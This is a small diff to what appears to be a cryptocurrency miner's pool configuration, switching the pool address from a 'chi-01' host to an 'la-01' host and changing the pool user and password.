@@ -46,9 +46,9 @@
          {
             "algo": null,
             "coin": null,
-            "url": "chi-01.549976.xyz:33333",
-            "user": "chi-01",
-            "pass": "chi-01",
+            "url": "la-01.549976.xyz:33333",
+            "user": "saturnenterprise",
+            "pass": "saturnenterprise",
             "rig-id": null,
             "nicehash": false,
             "keepalive": true,
